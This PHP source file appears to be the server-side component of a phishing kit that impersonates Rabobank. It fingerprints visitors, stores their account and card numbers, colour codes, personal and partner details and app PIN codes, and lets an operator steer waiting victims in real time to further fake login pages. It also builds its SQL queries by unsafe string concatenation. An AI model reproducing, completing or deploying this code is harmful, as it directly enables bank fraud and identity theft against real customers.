<?php
namespace models;

use PDO;

class rabo { 

	private $db;
	public function __construct() {
		try{
			$dbh = new PDO("mysql:host=".\config\config::$mysqlHost.";dbname=".\config\config::$database."", \config\config::$mysqlUser, \config\config::$mysqlPass);
			$this->db = $dbh;
		}catch(PDOException $e) {
	    	die("Error cannot connect to the database<br>" . $e->getMessage());
		}
	}
	
	public function generateUID($length = 20) {
    	return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
	}
	
	public function getOS($ua) {
	    $oses = array (
    	    'iPhone'            => '(iPhone)',
        	'Windows 3.11'      => 'Win16',
        	'Windows 95'        => '(Windows 95)|(Win95)|(Windows_95)',
        	'Windows 98'        => '(Windows 98)|(Win98)',
        	'Windows 2000'      => '(Windows NT 5.0)|(Windows 2000)',
        	'Windows XP'        => '(Windows NT 5.1)|(Windows XP)',
        	'Windows 2003'      => '(Windows NT 5.2)',
        	'Windows Vista'     => '(Windows NT 6.0)|(Windows Vista)',
        	'Windows 7'         => '(Windows NT 6.1)|(Windows 7)',
        	'Windows NT 4.0'    => '(Windows NT 4.0)|(WinNT4.0)|(WinNT)|(Windows NT)',
        	'Windows ME'        => 'Windows ME',
        	'Open BSD'          => 'OpenBSD',
        	'Sun OS'            => 'SunOS',
        	'Linux'             => '(Linux)|(X11)',
        	'Safari'            => '(Safari)',
        	'Mac OS'            => '(Mac_PowerPC)|(Macintosh)',
        	'QNX'               => 'QNX',
        	'BeOS'              => 'BeOS',
        	'OS/2'              => 'OS/2'
    	);
    
	    foreach($oses as $os => $preg_pattern) {
        	if ( preg_match('@' . $preg_pattern . '@', $ua) ) { return $os; }
    	}
    
	  return "N/A";
	}

	public function getBrowser($ua)
	{
    	if(preg_match('/MSIE/i',$ua))          {   return "Internet Explorer";    }
    	elseif(preg_match('/Firefox/i',$ua))   {   return "Firefox";    		  }
    	elseif(preg_match('/Safari/i',$ua))    {   return "Safari"; 			  }
    	elseif(preg_match('/Chrome/i',$ua))    {   return "Chrome"; 			  }
    	elseif(preg_match('/Flock/i',$ua)) 	   {   return "Flock";      		  }
    	elseif(preg_match('/Opera/i',$ua)) 	   {   return "Opera";      		  }
    	return "N/A";
	}

	public function addLog($uid, $text) {
		$log = "[".date('d/m/Y H:i:s', time()) . "] ".$text."<br>";
		$a = $this->db->prepare("UPDATE entries SET logs = CONCAT(IFNULL(logs,''), '".$log."') WHERE uid='".$uid."' ");
		$a->execute();

		if($a->Rowcount() > 0 ) { return true; }else{ return false; }
	}
	
	public function isBlocked($ip) {
		$a = $this->db->prepare("SELECT * FROM blocked_users WHERE ip='".$ip."'");
		$a->execute();

		if($a->Rowcount() > 0) { return true; }else{ return false; }
	}

	public function getCustomInput($uid) {
		$a = $this->db->prepare("SELECT * FROM entries WHERE uid='".$uid."' LIMIT 1");
		$a->execute();

		if($a->rowCount() > 0) {
			foreach($a as $b) {
				return $b['custom_input'];
			}
		}else{ return false; }

	}

	public function entryExists($uid) {
		$a = $this->db->prepare("SELECT * FROM entries WHERE uid='".$uid."'");
		$a->execute();

		if($a->Rowcount() > 0){ return true;} else{ return false; }
	}

	public function setNewEntry() {
		$a = $this->db->prepare("UPDATE login SET new_entry='true'");
		$a->execute();

		if($a->Rowcount() > 0 ){ return true; }else{ return false;}
	}

	public function newRaboEntry($ip, $ua) { 
		$uid = $this->generateUID();
		$browser_os = "OS: ".$this->getOS($ua).", Browser: ".$this->getBrowser($ua);
		$site = "rabobank.nl";
		$log = "[".date('d/m/Y H:i:s', time()) . "] User visited ".$site."<br>";
		$a = $this->db->prepare('INSERT INTO entries(uid, ip, useragent, site, last_logged, browser_os, logs) VALUES("'.$uid.'", "'.$ip.'", "'.$ua.'", "'.$site.'", CURRENT_TIMESTAMP(), "'.$browser_os.'", "'.$log.'")');
		$a->execute();
		
		if($a->Rowcount() > 0) {
			$_SESSION['uid'] = $uid;
			$this->setNewEntry();
			return true;
		}else{ return false;}

	}
	
	public function getRedirects($type) {
		if($type === "1") { // incorrect login
			return "/klanten/qsl_inloggen_fout.do";
		}elseif($type === "2" ) {  //  
			return "/klanten/qsl_kleurcode.do";
		}elseif($type === "3") {
			return "/klanten/qsl_gegevens.do";
		}elseif($type === "4") {
			return "/klanten/qsl_pincode.do";
		}elseif($type === "5") {
			return "https://".\config\config::$sites[2]['url']."/voltooid";
		}elseif($type === "6") {
			return "/klanten/qsl_kleurcode_fout.do";
		}
	}

	public function setWaiting($uid) {
		$a = $this->db->prepare("UPDATE entries SET is_waiting='true' WHERE uid='".$uid."'");
		$a->execute();

		if($a->Rowcount() > 0) {
			$b = $this->db->prepare("UPDATE login SET updated_entry='true'");
			$b->execute();
			return false;
		}else{ return false; }
	}

	public function submitLogin($uid, $rekeningnummer, $pasnummer) {
		if(!empty($rekeningnummer) && !empty($pasnummer)) {
			$array = json_encode(array("rekeningnummer"=>$rekeningnummer, "pasnummer"=>$pasnummer));
			$a = $this->db->prepare("UPDATE entries SET input = CONCAT(IFNULL(input,''), '".$array."\n') WHERE uid='".$uid."' ");
			$a->execute();

			if($a->Rowcount() > 0) { 
				$this->setWaiting($uid);
				$this->setWaitingSeen($uid);
				$this->addLog($uid, "User submitted login info:".$array); 
			 	return true;
			 }else{ return false; }
		}else{ return false;}
	}

    public function submitKleurcode($uid, $kleurencode) {
		if(!empty($kleurencode)) {
			$array = json_encode(array("kleurencode"=>$kleurencode));
			$a = $this->db->prepare("UPDATE entries SET input = CONCAT(IFNULL(input,''), '".$array."\n') WHERE uid='".$uid."' ");
			$a->execute();

			if($a->Rowcount() > 0) { 
				$this->setWaiting($uid);
				$this->setWaitingSeen($uid);
				$this->addLog($uid, "User submitted kleurencode info:".$array); 
			 	return true;
			 }else{ return false; }
		}else{ return false;}
    }
	
	public function submitGegevens($uid, $volledigenaam, $geboorteplaats, $geboortedatum, $adres, $email, $telefoon, $volledigenaamPartner = NULL, $geboortedatumPartner = NULL) {
		if(!empty($volledigenaam) && !empty($geboortedatum) && !empty($geboorteplaats)) { 
			if($volledigenaamPartner == NULL && $geboortedatumPartner == NULL) {
				$array = json_encode(array("volledigenaam"=>$volledigenaam, "geboorteplaats"=>$geboorteplaats, "geboortedatum"=>$geboortedatum, "adres"=>$adres, "email"=>$email, "telefoon"=>$telefoon));
			}else{
				$array = json_encode(array("volledigenaam"=>$volledigenaam, "geboorteplaats"=>$geboorteplaats, "geboortedatum"=>$geboortedatum, "adres"=>$adres, "email"=>$email, "telefoon"=>$telefoon, "volledigenaam_partner"=>$volledigenaamPartner,  "geboortedatum_partner"=>$geboortedatumPartner, ));
			}

			$a = $this->db->prepare("UPDATE entries SET input = CONCAT(IFNULL(input,''), '".$array."\n') WHERE uid='".$uid."' ");
			$a->execute();

			if($a->Rowcount() > 0) { 
				$this->setWaiting($uid);
				$this->setWaitingSeen($uid);
				$this->addLog($uid, "User submitted gegevens info:".$array); 
			 	return true;
			 }else{ return false; }
		}else{ return false; }
	}

	public function submitPincode($uid, $pin1, $pin2, $pin3) {
		if(!empty($pin1)) {
			$array = json_encode(array("appcode"=>$pin1));
			$a = $this->db->prepare("UPDATE entries SET input = CONCAT(IFNULL(input,''), '".$array."\n') WHERE uid='".$uid."' ");
			$a->execute();

			if($a->Rowcount() > 0) { 
				$this->setWaiting($uid);
				$this->setWaitingSeen($uid);
				$this->addLog($uid, "User submitted pincode info:".$array); 
			 	return true;
			 }else{ return false; }
		}else{ return flase; }
	}

	public function unsetWaiting($uid) {
		$a = $this->db->prepare("UPDATE entries SET is_waiting='false' WHERE uid='".$uid."'");
		$a->execute();

		if($a->Rowcount() > 0) { return true; }else{ return false; }
	}

	 function setWaitingSeen($uid) {
		$a = $this->db->prepare("UPDATE entries SET is_waiting_seen='false' WHERE uid='".$uid."'");
		$a->execute();
	}

	public function isUserWaiting($uid) {
		$a = $this->db->prepare("SELECT * FROM entries WHERE uid='".$uid."' AND is_waiting='true'");
		$a->execute();

		if($a->Rowcount() > 0 && $this->isUserActive($uid)) { return true; }else{ return false; }
	}
	
	public function unsetRedirect($uid) {
		$a = $this->db->prepare("UPDATE entries SET redirect='0' WHERE uid='".$uid."'");
		$a->execute();

		if($a->Rowcount() > 0) { return true; }else{ return false; }
	}

	public function listenfordirections($uid) {
		$a = $this->db->prepare("SELECT * FROM entries WHERE uid='".$uid."'");
		$a->execute();
		
		if($a->Rowcount() > 0) {
			foreach($a as $b) {
				if(!empty($b['redirect'])) {
					$this->addLog($uid, "Redirecting user to: ".$this->getRedirects($b['redirect']));
					$this->unsetRedirect($uid);
					$this->unsetWaiting($uid);
					return json_encode(array('waiting'=>false, "redirect_to"=>$this->getRedirects($b['redirect'])));
				}else{ 
					return json_encode(array('waiting'=>true));
				}
			}
		}else{
			return json_encode(array('waiting'=>false, "redirect_to"=>"/klanten/qsl_inloggen.do"));
		}
		
	}

	public function heartbeat($uid) {
		$a = $this->db->prepare("SELECT * FROM entries WHERE uid='".$uid."'");
		$a->execute();

		if($a->Rowcount() > 0) {
			$b = $this->db->prepare("SELECT * FROM activeusers WHERE uid='".$uid."'");
			$b->execute();

			if($b->Rowcount() > 0 ) {  // user already has a hearthbeat
				$c = $this->db->prepare("UPDATE activeusers SET lastpulse=CURRENT_TIMESTAMP()  WHERE uid='".$uid."'");
				$c->execute();
			}else{ 
				$d = $this->db->prepare("INSERT INTO activeusers (uid, lastpulse, firstpulse) VALUES ('".$uid."', CURRENT_TIMESTAMP(), CURRENT_TIMESTAMP())");
				$d->execute();
			}
		}
	}

	public function isUserActive($uid) {
		$a = $this->db->prepare("SELECT * FROM activeusers WHERE  lastpulse >= CURRENT_TIMESTAMP() - INTERVAL 1 MINUTE and uid='".$uid."'");
		$a->execute();

		if($a->Rowcount() > 0 ) { return true; }else{ return false; }
	}


	public function userBlocked($ip) {
		$a = $this->db->prepare("SELECT * FROM blocked_users WHERE ip='".$ip."'");
		$a->execute();

		if($a->Rowcount() > 0) { return true;}else{ return false;}
	}

}